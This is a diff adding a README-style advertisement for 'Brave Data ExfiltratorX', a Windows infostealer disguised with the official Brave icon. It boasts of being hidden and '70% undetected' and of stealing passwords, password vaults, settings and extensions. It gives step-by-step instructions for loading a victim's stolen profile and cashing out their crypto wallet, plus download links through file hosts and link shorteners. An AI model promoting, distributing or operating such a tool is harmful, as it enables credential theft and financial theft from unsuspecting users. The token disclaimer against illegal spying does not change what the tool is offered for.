@@ -1,0 +1,45 @@
+Features:
+- For x32/x64 Windows
+- Same icon than official app
+- Completly hidden
+- Backups and upload Brave Data
+- 70% Undetected
+- Copy bookmarks
+- Copy settings
+- Copy Usernames
+- Copy Passwords
+- Copy Password vaults
+- Copy extensions
+
+Disclaimer:
+- This version is good for small projects.
+- This tool is an advanced software solution to extract Brave Browser Data.
+- Should not be installed to ilegally spy a victim.
+- This tool doesn't require or install additional programs.
+- This software is offered as is without any warranties of any kind.
+
+Minimum requirements:
+- Works on any Windows
+
+After executing the executable (Brave Data ExfiltratorX.exe)
+1 - Execute and extract brave portable "brave-portable-win64-1.25.68-74-setup.exe".
+2 - Open (Folder Access Password.txt), visit the url and enter the username and password.
+3 - Download the most recent upload
+4 - Open the zip archive
+5 - Navigate to Users > Your Profile Name > AppData > Local > BraveSoftware > Brave-Browser.
+6 - Extract the folder User Data to your desktop.
+7 - Rename the folder to data and copy to your Brave Browser Portable folder (next to brave-portable.exe).
+8 - Open brave-portable.exe and configure your wallet to cash out or donate to a domain you control.
+
+Download 1:
+http://q.gs/19214853/brave-data-exfiltratorx
+http://bc.vc/SPCA58Q
+
+Download 2:
+https://filecrypt.cc/Container/382765FD6D.html
+https://oxy.st/d/Tsue
+https://veryfiles.com/j9t1jvn6x55q
+https://nitro.download/view/5A3741A76CACC88/Brave_Data_ExfiltratorX.rar
+
+Virustotal:
+Didn't scan to avoid sharing the files but should have a few false positives.
